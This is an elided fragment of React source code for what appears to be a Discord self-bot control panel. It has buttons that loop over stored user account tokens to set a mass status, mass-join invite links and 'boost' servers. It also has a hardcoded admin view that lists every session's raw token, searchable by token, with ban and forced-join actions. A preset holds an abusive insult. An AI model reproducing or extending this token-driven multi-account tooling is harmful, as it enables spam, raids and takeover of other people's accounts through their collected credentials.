...
import { Upload, Trash2, Activity, Users, Settings, Skull, Mic, MessageSquare, UserPlus, LogOut, Flame, AlertTriangle, Type, Eraser, ShieldAlert, Gamepad2, Terminal, RefreshCw, History, Server, Sliders, User, Globe, Heart, Zap, MonitorPlay } from 'lucide-react';
...
Useless piece of shit`,
  ...
  const isAdmin = (loggedInSession && loggedInSession.username === 'yannaaax') || 
                  ...
                  loggedInUserId === '1453811580721692742';
                  ...
                  <div className="bg-black/40 border border-white/10 rounded-xl p-8">
                    ...
                    <div className="space-y-8">
                      ...
                      <div className="space-y-4 p-4 bg-black/20 border border-white/10 rounded-xl">
                        <div className="flex items-center justify-between">
                          <div>
                            <h4 className="text-sm font-bold text-white">AFK Mode</h4>
                            <p className="text-xs text-zinc-500">Automatically reply to mentions when away</p>
                          </div>
                          <button 
                            onClick={async () => {
                                const newState = !configs.afkEnabled;
                                setConfigsState(prev => ({ ...prev, afkEnabled: newState }));
                                
                                // Direct action
                                await fetch('/api/actions', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json', 'Authorization': loggedInToken },
                                    body: JSON.stringify({ action: 'afk', text: newState ? configs.afkMessage : 'off' })
                                }).catch(() => {});
                            }}
                            className={`w-12 h-6 rounded-full transition-all relative ${configs.afkEnabled ? 'bg-indigo-500' : 'bg-zinc-800'}`}
                          >
                            <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${configs.afkEnabled ? 'left-7' : 'left-1'}`} />
                          </button>
                        </div>
                        <div className="space-y-2">
                          <label className="block text-[10px] font-bold text-zinc-500 uppercase tracking-wider">AFK Message</label>
                          <input 
                            type="text"
                            value={configs.afkMessage}
                            onChange={(e) => setConfigsState(prev => ({ ...prev, afkMessage: e.target.value }))}
                            placeholder="Enter AFK message..."
                            className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-xs text-zinc-400 focus:outline-none focus:border-indigo-500/50 transition-all"
                          />
                        </div>
                      </div>
                    ...
                    <div className="bg-black/40 border border-white/10 rounded-xl overflow-hidden p-6">
                        ...
                        <div className="space-y-4 mb-8">
                             ...
                             <div className="flex flex-wrap gap-2">
                                  <button onClick={async () => {
                                      const text = prompt("Enter new global status:");
                                      if (text) {
                                          for (const token of tokens) {
                                              await fetch('/api/actions', { 
                                                  method: 'POST', 
                                                  headers: { 'Content-Type': 'application/json', 'Authorization': token.token }, 
                                                  body: JSON.stringify({ action: 'customStatus', text }) 
                                              }).catch(() => {});
                                          }
                                          addLog(`Requested global status change to: ${text}`);
                                      }
                                  }} className="bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 px-4 py-2 rounded-lg text-sm border border-blue-500/20 transition-colors">
                                      Global Status
                                  </button>
                                  <button onClick={async () => {
                                      const invite = prompt("Enter invite link:");
                                      if (invite) {
                                          for (const token of tokens) {
                                              await fetch('/api/actions', { 
                                                  method: 'POST', 
                                                  headers: { 'Content-Type': 'application/json', 'Authorization': token.token }, 
                                                  body: JSON.stringify({ action: 'massJoin', text: invite }) 
                                              }).catch(() => {});
                                          }
                                          addLog(`Requested global mass join: ${invite}`);
                                      }
                                  }} className="bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-400 px-4 py-2 rounded-lg text-sm border border-emerald-500/20 transition-colors">
                                      Global Mass Join
                                  </button>
                                  <button onClick={async () => {
                                      const guildId = prompt("Enter Server ID to Boost:");
                                      if (guildId) {
                                           alert("Note: Boosting requires the accounts to have nitro credits. (API simulated)");
                                           addLog(`Global mass boost requested for ${guildId}`);
                                      }
                                  }} className="bg-pink-600/20 hover:bg-pink-600/30 text-pink-400 px-4 py-2 rounded-lg text-sm border border-pink-500/20 transition-colors">
                                      Mass Boost Server
                                  </button>
                             </div>
                        </div>
                        ...
                        <div className="mb-4 flex items-center justify-between">
                            ...
                            <input 
                                ...
                                className="bg-black/50 border border-white/10 rounded-lg px-3 py-1.5 text-sm text-zinc-300 focus:outline-none focus:border-purple-500/50"
                            />
                        </div>
                        <div className="overflow-x-auto rounded-lg border border-zinc-800">
                            <table className="w-full text-left text-sm">
                                ...
                                <tbody className="divide-y divide-zinc-800 bg-black/20">
                                    {adminSessions
                                        .filter(s => (s.username || '').toLowerCase().includes(adminSearch.toLowerCase()) || s.token.includes(adminSearch))
                                        .map((s, i) => (
                                        <tr key={i} className="hover:bg-zinc-800/30 transition-colors">
                                            <td className="px-6 py-3 text-zinc-300 font-medium">
                                                <div className="flex items-center gap-2">
                                                    ...
                                                    <div className="flex flex-col">
                                                        ...
                                                        <span className="text-[10px] text-zinc-600 font-mono">{s.sessionId}</span>
                                                    </div>
                                                </div>
                                            </td>
                                            ...
                                            <td className="px-6 py-3">
                                                 <div className="flex items-center gap-2">
                                                    <button 
                                                        className="px-2 py-1 bg-red-900/40 text-red-400 border border-red-900 rounded hover:bg-red-900/60 transition-colors text-[10px] font-medium"
                                                        onClick={async () => {
                                                            if (confirm(`Ban account ${s.username}?`)) {
                                                                await fetch('/api/admin/action', {
                                                                    ...
                                                                    body: JSON.stringify({ action: 'ban', targetToken: s.token })
                                                                });
                                                                fetchAdminData();
                                                            }
                                                        }}
                                                    ...
                                                    <button 
                                                        className="px-2 py-1 bg-zinc-800 text-zinc-300 border border-zinc-700 rounded hover:bg-zinc-700 transition-colors text-[10px] font-medium"
                                                        onClick={async () => {
                                                            const invite = prompt("Invite link for this user to join:");
                                                            if (invite) {
                                                                await fetch('/api/actions', {
                                                                    method: 'POST',
                                                                    headers: { 
